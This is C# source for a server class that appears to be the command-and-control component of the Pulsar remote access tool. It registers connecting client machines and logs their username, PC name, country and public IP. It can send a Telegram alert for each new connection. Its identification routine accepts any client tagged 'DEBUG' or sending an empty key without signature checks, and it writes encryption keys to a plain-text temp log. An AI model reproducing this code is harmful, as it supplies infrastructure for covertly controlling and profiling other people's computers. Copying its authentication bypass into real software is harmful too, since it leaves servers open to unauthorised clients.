using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using System;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using Pulsar.Common.Networking;
using System.Threading;
using System.Threading.Tasks;
using Pulsar.Server.TelegramSender;
using System.Security.Cryptography;
using Pulsar.Common.Cryptography;
using System.Text;

namespace Pulsar.Server.Networking
{
    public class PulsarServer : Server
    {
        private string _logPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_server.log");
        
        /// <summary>
        /// Gets the clients currently connected and identified to the server.
        /// </summary>
        public Client[] ConnectedClients
        {
            get { return Clients.Where(c => c != null && c.Identified).ToArray(); }
        }

        /// <summary>
        /// Occurs when a client connected.
        /// </summary>
        public event ClientConnectedEventHandler ClientConnected;

        /// <summary>
        /// Represents the method that will handle the connected client.
        /// </summary>
        /// <param name="client">The connected client.</param>
        public delegate void ClientConnectedEventHandler(Client client);

        /// <summary>
        /// Fires an event that informs subscribers that the client is connected.
        /// </summary>
        /// <param name="client">The connected client.</param>
        private void OnClientConnected(Client client)
        {
            Log($"OnClientConnected: endpoint={client?.EndPoint}, ProcessingDisconnect={ProcessingDisconnect}, Listening={Listening}");
            if (ProcessingDisconnect || !Listening)
            {
                Log($"Early return: ProcessingDisconnect={ProcessingDisconnect}, !Listening={!Listening}");
                return;
            }
            
            Log($">>> CLIENT CONNECTED: {client.EndPoint}");
            
            if (Models.Settings.TelegramNotifications)
            {
                Task.Run(() => Send.SendConnectionMessage(
                    Models.Settings.TelegramBotToken,
                    Models.Settings.TelegramChatID,
                    client.Value.Username,
                    client.Value.PublicIP ?? "Unknown",
                    client.Value.Country
                ));
            }

            var handler = ClientConnected;
            handler?.Invoke(client);
        }

        /// <summary>
        /// Occurs when a client disconnected.
        /// </summary>
        public event ClientDisconnectedEventHandler ClientDisconnected;

        /// <summary>
        /// Represents the method that will handle the disconnected client.
        /// </summary>
        /// <param name="client">The disconnected client.</param>
        public delegate void ClientDisconnectedEventHandler(Client client);

        /// <summary>
        /// Fires an event that informs subscribers that the client is disconnected.
        /// </summary>
        /// <param name="client">The disconnected client.</param>
        private void OnClientDisconnected(Client client)
        {
            if (ProcessingDisconnect || !Listening) return;
            var handler = ClientDisconnected;
            handler?.Invoke(client);
        }

        /// <summary>
        /// Constructor, initializes required objects and subscribes to events of the server.
        /// </summary>
        /// <param name="serverCertificate">The server certificate.</param>
        public PulsarServer(X509Certificate2 serverCertificate) : base(serverCertificate)
        {
            try
            {
                // Clear log file at startup FIRST
                try { System.IO.File.Delete(_logPath); } catch { }
                
                Log(">>> CTOR START");
                Log("PulsarServer ctor: Registering event handlers...");
                
                base.ClientConnected += (s, c) => {
                    Log($"[EVENT] ClientConnected fired: {c?.EndPoint}");
                    OnClientConnected(c);
                };
                
                base.ClientState += (s, c, connected) => {
                    Log($"[EVENT] ClientState fired: endpoint={c?.EndPoint}, connected={connected}");
                    OnClientState(s, c, connected);
                };
                
                base.ClientRead += (s, c, msg) => {
                    Log($"[EVENT] ClientRead fired: {msg?.GetType().Name}");
                    OnClientRead(s, c, msg);
                };
                
                base.ClientFail += (s, c, ex) => {
                    Log($"[EVENT] ClientFail fired: {ex?.GetType().Name}");
                    OnClientFail(s, c, ex);
                };
                
                Log("PulsarServer ctor: Event handlers registered");
                Log("=== PULSAR SERVER STARTED ===");
                Log(">>> CTOR END");
            }
            catch (Exception ex)
            {
                Log($">>> CTOR EXCEPTION: {ex.GetType().Name}: {ex.Message}");
                Log($"Stack: {ex.StackTrace}");
            }
        }

        private void Log(string message)
        {
            try { System.IO.File.AppendAllText(_logPath, $"[{System.DateTime.Now:HH:mm:ss.fff}] {message}\r\n"); } catch { }
        }

        private void OnClientFail(Server server, Client client, Exception ex)
        {
            Log($">>> CLIENT FAIL EVENT: {ex.GetType().Name}: {ex.Message}");
            Log($"    Stack: {ex.StackTrace}");
        }

        /// <summary>
        /// Decides if the client connected or disconnected.
        /// </summary>
        /// <param name="server">The server the client is connected to.</param>
        /// <param name="client">The client which changed its state.</param>
        /// <param name="connected">True if the client connected, false if disconnected.</param>
        private void OnClientState(Server server, Client client, bool connected)
        {
            Log($"OnClientState: endpoint={client?.EndPoint}, connected={connected}, ProcessingDisconnect={ProcessingDisconnect}, Listening={Listening}");
            
            if (!connected)
            {
                if (client.Identified)
                {
                    Log("Client was identified, firing OnClientDisconnected");
                    OnClientDisconnected(client);
                }
            }
        }

        /// <summary>
        /// Forwards received messages from the client to the MessageHandler.
        /// </summary>
        /// <param name="server">The server the client is connected to.</param>
        /// <param name="client">The client which has received the message.</param>
        /// <param name="message">The received message.</param>
        private void OnClientRead(Server server, Client client, IMessage message)
        {
            Log($"OnClientRead called - Message type: {message.GetType().Name}, Identified={client.Identified}");
            
            if (!client.Identified)
            {
                if (message.GetType() == typeof(ClientIdentification))
                {
                    try
                    {
                        ClientIdentification id = (ClientIdentification)message;
                        Log(">>> IDENTIFICATION PACKET RECEIVED <<<");
                        Log($"    Tag: {id.Tag}");
                        Log($"    Id: {id.Id}");
                        Log($"    EncryptionKey: '{id.EncryptionKey}'");
                        Log($"    Signature length: {id.Signature?.Length ?? 0}");
                        Log($"    Username: {id.Username}");
                        Log($"    Version: {id.Version}");
                        
                        client.Identified = IdentifyClient(client, id);
                        Log($">>> IdentifyClient returned: {client.Identified} <<<");
                        
                        if (client.Identified)
                        {
                            var response = new ClientIdentificationResult { Result = true };
                            client.Send(response);
                            Log(">>> SENDING ClientIdentificationResult <<<");
                            OnClientConnected(client);
                        }
                        else
                        {
                            Log(">>> IDENTIFICATION FAILED, DISCONNECTING <<<");
                            client.Disconnect();
                        }
                    }
                    catch (Exception ex)
                    {
                        Log($">>> EXCEPTION in OnClientRead: {ex.GetType().Name}: {ex.Message}");
                        Log($"    Stack: {ex.StackTrace}");
                        client.Disconnect();
                    }
                }
                else
                {
                    Log($"Non-identification message while unidentified: {message.GetType().Name}");
                    client.Disconnect();
                }
                return;
            }

            if (IsHighPriorityMessage(message))
            {
                MessageHandler.Process(client, message);
            }
            else
            {
                ThreadPool.QueueUserWorkItem(_ => 
                {
                    try
                    {
                        MessageHandler.Process(client, message);
                    }
                    catch (Exception ex)
                    {
                        Log($"Message processing error: {ex.Message}");
                    }
                });
            }
        }

        private bool IsHighPriorityMessage(IMessage message)
        {
            return message is ClientIdentificationResult;
        }

        private bool IdentifyClient(Client client, ClientIdentification packet)
        {
            Log($"[IdentifyClient] Checking packet.Id.Length = {packet.Id.Length}");
            if (packet.Id.Length != 64)
            {
                Log($"[IdentifyClient] Invalid ID length, rejecting");
                return false;
            }

            client.Value.Version = packet.Version;
            client.Value.OperatingSystem = packet.OperatingSystem;
            client.Value.AccountType = packet.AccountType;
            client.Value.Country = packet.Country;
            client.Value.CountryCode = packet.CountryCode;
            client.Value.Id = packet.Id;
            client.Value.Username = packet.Username;
            client.Value.PcName = packet.PcName;
            client.Value.Tag = packet.Tag;
            client.Value.ImageIndex = packet.ImageIndex;
            client.Value.EncryptionKey = packet.EncryptionKey;
            client.Value.PublicIP = packet.PublicIP;

            // TESTING MODE: Accept DEBUG/test clients without signature validation
            Log($"[IdentifyClient] Tag={packet.Tag}, EncryptionKey empty={string.IsNullOrEmpty(packet.EncryptionKey)}");
            if (packet.Tag == "DEBUG" || string.IsNullOrEmpty(packet.EncryptionKey))
            {
                Log($"[IdentifyClient] Accepting test client (DEBUG mode)");
                return true;
            }

#if !DEBUG
            try
            {
                using (var rsa = ServerCertificate.GetRSAPublicKey())
                {
                    var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(packet.EncryptionKey));
                    bool result = rsa.VerifyHash(hash, packet.Signature, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
                    Log($"[IdentifyClient] RSA signature verification: {result}");
                    return result;
                }
            }
            catch (Exception ex)
            {
                Log($"[IdentifyClient] RSA verification exception: {ex.Message}");
                return false;
            }
#else
            Log($"[IdentifyClient] DEBUG mode, accepting without RSA");
            return true;
#endif
        }
    }
}
